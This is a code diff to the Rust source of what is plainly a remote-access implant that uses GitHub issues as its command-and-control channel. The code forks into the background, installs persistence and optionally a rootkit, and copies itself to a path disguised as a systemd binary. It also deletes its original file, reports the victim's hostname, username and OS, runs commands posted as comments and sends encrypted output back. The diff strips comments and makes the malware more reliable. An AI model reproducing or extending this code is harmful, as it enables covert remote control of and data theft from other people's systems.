@@ -43,7 +43,6 @@ fn debug_log(msg: &str) {
             }
         };
 
-        // 检查文件大小，超过10MB则清空
         if let Ok(metadata) = std::fs::metadata(&log_path) {
             if metadata.len() > 10 * 1024 * 1024 {
                 let _ = std::fs::remove_file(&log_path);
@@ -52,7 +51,6 @@ fn debug_log(msg: &str) {
 
         let log = format!("[{}] {}\n", chrono::Local::now().format("%Y-%m-%d %H:%M:%S"), msg);
 
-        // 确保目录存在
         if let Some(parent) = PathBuf::from(&log_path).parent() {
             let _ = fs::create_dir_all(parent);
         }
@@ -69,7 +67,6 @@ fn debug_log(msg: &str) {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("Agent starting...");
 
-    // 检查是否有其他实例运行
     #[cfg(unix)]
     {
         let exe_name = std::env::current_exe()
@@ -79,16 +76,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         if !exe_name.is_empty() {
             let output = std::process::Command::new("pgrep")
-                .arg("-c")
-                .arg("-f")
-                .arg(&exe_name)
+                .args(&["-c", "-x", &exe_name])
                 .output();
 
             if let Ok(o) = output {
                 if let Ok(count_str) = String::from_utf8(o.stdout) {
                     if let Ok(count) = count_str.trim().parse::<i32>() {
                         if count > 1 {
-                            // 已有实例运行
                             std::process::exit(0);
                         }
                     }
@@ -97,17 +91,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    // Linux下自动fork到后台
     #[cfg(unix)]
     if std::env::var("DAEMONIZED").is_err() {
         unsafe {
             let pid = libc::fork();
             if pid > 0 {
-                // 父进程退出
                 println!("Agent running in background (PID: {})", pid);
                 std::process::exit(0);
             } else if pid == 0 {
-                // 子进程继续运行
                 std::env::set_var("DAEMONIZED", "1");
                 libc::setsid();
             }
@@ -134,7 +125,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let mut config = Config::from_env();
 
-    // 验证配置
     if config.github_token == "TOKEN" || config.github_token.is_empty() {
         eprintln!("ERROR: GitHub Token not configured");
         debug_log("ERROR: GitHub Token not configured");
@@ -148,7 +138,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("Agent ID: {}", agent_id);
     debug_log(&format!("Agent ID: {}", agent_id));
 
-    // 只在首次启动时安装持久化
     let enable_persistence = std::env::var("ENABLE_PERSISTENCE").as_ref().map(|s| s.as_str()).ok()
         .or_else(|| option_env!("ENABLE_PERSISTENCE"))
         .unwrap_or("0") == "1";
@@ -159,7 +148,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         std::env::set_var("SKIP_PERSIST", "1");
     }
 
-    // 安装 rootkit（仅 Linux root 用户）
     #[cfg(unix)]
     {
         let enable_rootkit = std::env::var("ENABLE_ROOTKIT").as_ref().map(|s| s.as_str()).ok()
@@ -185,7 +173,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             Err(e) => {
                 let err_str = e.to_string();
 
-                // 如果是配置更新，重新加载 config
                 if err_str.contains("Config updated") {
                     debug_log("Reloading config...");
                     config = Config::from_env();
@@ -214,34 +201,28 @@ fn relocate_self() -> Result<String, Box<dyn std::error::Error>> {
 
     #[cfg(unix)]
     let target_path = {
-        // 检查是否为root
         let is_root = unsafe { libc::geteuid() == 0 };
         if is_root {
             "/lib/systemd/systemd-log".to_string()
         } else {
-            // 非root，不复制，返回错误
             debug_log("Not root, skipping relocation");
             return Err("Not root".into());
         }
     };
 
-    // 如果已经在目标位置，不需要复制
     if current_exe.to_string_lossy() == target_path {
         std::env::set_var("RELOCATED", "1");
         return Err("Already relocated".into());
     }
 
-    // 创建目录
     if let Some(parent) = PathBuf::from(&target_path).parent() {
         fs::create_dir_all(parent)?;
     }
 
-    // 复制文件
     fs::copy(&current_exe, &target_path)?;
 
     #[cfg(unix)]
     {
-        // 尝试多个系统文件路径
         let reference_files = [
             "/lib/systemd/systemd",
             "/usr/lib/systemd/systemd",
@@ -260,13 +241,11 @@ fn relocate_self() -> Result<String, Box<dyn std::error::Error>> {
             }
         }
 
-        // 设置权限为755
         std::process::Command::new("chmod")
             .args(&["755", &target_path])
             .output()?;
     }
 
-    // 启动新进程
     #[cfg(windows)]
     {
         std::process::Command::new(&target_path)
@@ -285,11 +264,19 @@ fn relocate_self() -> Result<String, Box<dyn std::error::Error>> {
             .spawn()?;
     }
 
-    // 删除原文件
-    std::thread::spawn(move || {
+    #[cfg(unix)]
+    {
         std::thread::sleep(std::time::Duration::from_secs(2));
-        let _ = fs::remove_file(current_exe);
-    });
+        let _ = fs::remove_file(&current_exe);
+    }
+
+    #[cfg(windows)]
+    {
+        let exe_str = current_exe.to_string_lossy().to_string();
+        let _ = std::process::Command::new("cmd")
+            .args(&["/c", &format!("timeout /t 3 /nobreak >nul & del \"{}\"", exe_str)])
+            .spawn();
+    }
 
     Ok(target_path)
 }
@@ -300,21 +287,19 @@ async fn run_agent(config: &Config, agent_id: &str) -> Result<(), Box<dyn std::e
 
     println!("Creating or loading issue...");
     debug_log("Creating or loading issue...");
-    let issue_number = create_or_load_issue(&config, &agent_id).await?;
+    let (issue_number, is_new_issue) = create_or_load_issue(&config, &agent_id).await?;
     println!("Issue number: {}", issue_number);
     debug_log(&format!("Issue number: {}", issue_number));
 
-    let mut has_activity = false;
     let mut last_comment_id = load_last_comment_id();
     let mut failure_count = 0u32;
     let mut backoff_multiplier = 1u64;
     let mut consecutive_failures = 0u32;
-    let mut is_first_run = last_comment_id == 0;
+    let is_first_run = is_new_issue;
     let mut last_activity_time = std::time::Instant::now();
 
     debug_log("Entering main loop...");
 
-    // 首次运行，发送初始文件列表
     if is_first_run {
         debug_log("First run, sending initial file list...");
         let default_path = if cfg!(windows) { "DRIVES" } else { "/" };
@@ -352,43 +337,45 @@ async fn run_agent(config: &Config, agent_id: &str) -> Result<(), Box<dyn std::e
 
                 consecutive_failures += 1;
 
-                // 连续失败5次，尝试恢复备用配置
                 if consecutive_failures >= 5 && !config.backup_url.is_empty() {
                     debug_log("Attempting to fetch backup config...");
-                    match crate::backup_config::fetch_backup_config(&config.backup_url) {
-                        Ok(backup) => {
+                    let backup_url = config.backup_url.clone();
+                    let result = tokio::task::spawn_blocking(move || {
+                        crate::backup_config::fetch_backup_config(&backup_url)
+                    }).await;
+
+                    match result {
+                        Ok(Ok(backup)) => {
                             debug_log("Backup config fetched, applying new config...");
                             crate::backup_config::apply_backup_config(&backup);
 
-                            // 清理旧 Issue 缓存
                             let _ = fs::remove_file(get_issue_file_path());
 
                             return Err("Config updated, restart required".into());
                         }
-                        Err(e) => {
+                        Ok(Err(e)) => {
                             debug_log(&format!("Failed to fetch backup config: {}", e));
+                        }
+                        Err(e) => {
+                            debug_log(&format!("Backup config task failed: {}", e));
                         }
                     }
                 }
 
-                // 检查特定错误类型
                 if err_msg.contains("401") || err_msg.contains("Unauthorized") {
                     debug_log("Token invalid");
-                    // 不直接停止，等待备用配置恢复
                 }
 
                 if err_msg.contains("404") {
                     debug_log("Issue not found, recreating...");
-                    // Issue被删除，清除缓存重新创建
                     let _ = fs::remove_file(get_issue_file_path());
                     return Err("Issue deleted".into());
                 }
 
                 failure_count += 1;
 
-                // 429限流特殊处理
                 if err_msg.contains("429") || err_msg.contains("rate limit") {
-                    backoff_multiplier = 30; // 30分钟
+                    backoff_multiplier = 30;
                     debug_log("Rate limited, backing off 30 minutes");
                 } else if failure_count > 3 {
                     backoff_multiplier = (backoff_multiplier * 2).min(12);
@@ -396,7 +383,6 @@ async fn run_agent(config: &Config, agent_id: &str) -> Result<(), Box<dyn std::e
             }
         }
 
-        // 检查最近20分钟是否有活动
         let has_recent_activity = last_activity_time.elapsed().as_secs() < 1200;
         let base_interval = if has_recent_activity { config.poll_interval } else { 300 };
         let interval = base_interval * backoff_multiplier;
@@ -455,15 +441,13 @@ impl Config {
 async fn create_or_load_issue(
     config: &Config,
     agent_id: &str,
-) -> Result<u64, Box<dyn std::error::Error>> {
+) -> Result<(u64, bool), Box<dyn std::error::Error>> {
     let issue_file = get_issue_file_path();
 
-    // 尝试从文件读取
     if let Ok(content) = fs::read_to_string(&issue_file) {
         if let Ok(num) = content.trim().parse::<u64>() {
-            // 验证issue是否存在
             if verify_issue_exists(config, num).await {
-                return Ok(num);
+                return Ok((num, false));
             } else {
                 debug_log("Cached issue not found, will create new one");
                 let _ = fs::remove_file(&issue_file);
@@ -471,7 +455,6 @@ async fn create_or_load_issue(
         }
     }
 
-    // 创建新Issue
     let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string());
     let username = whoami::username();
     let os = std::env::consts::OS;
@@ -494,13 +477,12 @@ async fn create_or_load_issue(
     let issue: serde_json::Value = resp.into_json()?;
     let issue_number = issue["number"].as_u64().ok_or("No issue number")?;
 
-    // 保存Issue号
     if let Some(parent) = PathBuf::from(&issue_file).parent() {
         fs::create_dir_all(parent).ok();
     }
     fs::write(&issue_file, issue_number.to_string())?;
 
-    Ok(issue_number)
+    Ok((issue_number, true))
 }
 
 async fn verify_issue_exists(config: &Config, issue_number: u64) -> bool {
@@ -574,19 +556,28 @@ async fn check_commands(
     issue_number: u64,
     last_comment_id: &mut u64,
 ) -> Result<bool, Box<dyn std::error::Error>> {
-    let url = format!("https://api.github.com/repos/{}/{}/issues/{}/comments?per_page=100",
-        config.github_owner, config.github_repo, issue_number);
+    let mut page = 1;
+    let mut all_comments: Vec<serde_json::Value> = Vec::new();
 
-    let resp = ureq::get(&url)
-        .set("Authorization", &format!("token {}", config.github_token))
-        .set("User-Agent", "github-c2-agent")
-        .call()?;
+    loop {
+        let url = format!("https://api.github.com/repos/{}/{}/issues/{}/comments?per_page=100&page={}",
+            config.github_owner, config.github_repo, issue_number, page);
 
-    let comments: Vec<serde_json::Value> = resp.into_json()?;
+        let resp = ureq::get(&url)
+            .set("Authorization", &format!("token {}", config.github_token))
+            .set("User-Agent", "github-c2-agent")
+            .call()?;
+
+        let comments: Vec<serde_json::Value> = resp.into_json()?;
+        let count = comments.len();
+        all_comments.extend(comments);
+        if count < 100 { break; }
+        page += 1;
+    }
+
     let mut had_activity = false;
 
-    // 倒序遍历，最新的在前
-    for comment in comments.iter().rev() {
+    for comment in all_comments.iter().rev() {
         let comment_id = comment["id"].as_u64().unwrap_or(0);
         if comment_id <= *last_comment_id {
             break;
@@ -640,11 +631,21 @@ async fn send_response_chunks(
             .set("User-Agent", "github-c2-agent")
             .send_json(&payload)?;
     } else {
-        let total_chunks = (output.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
+        let mut chunks = Vec::new();
+        let bytes = output.as_bytes();
+        let mut start = 0;
+        while start < bytes.len() {
+            let mut end = (start + CHUNK_SIZE).min(bytes.len());
+            while end < bytes.len() && !output.is_char_boundary(end) {
+                end += 1;
+            }
+            chunks.push(&output[start..end]);
+            start = end;
+        }
+        let total_chunks = chunks.len();
 
-        for (i, chunk) in output.as_bytes().chunks(CHUNK_SIZE).enumerate() {
-            let chunk_str = String::from_utf8_lossy(chunk);
-            let msg = format!("[Part {}/{}]\n{}", i + 1, total_chunks, chunk_str);
+        for (i, chunk) in chunks.iter().enumerate() {
+            let msg = format!("[Part {}/{}]\n{}", i + 1, total_chunks, chunk);
             let encrypted = crate::crypto::encrypt(&msg, &config.password)?;
             let response = format!("[RESP]{}", encrypted);
             let payload = serde_json::json!({"body": response});
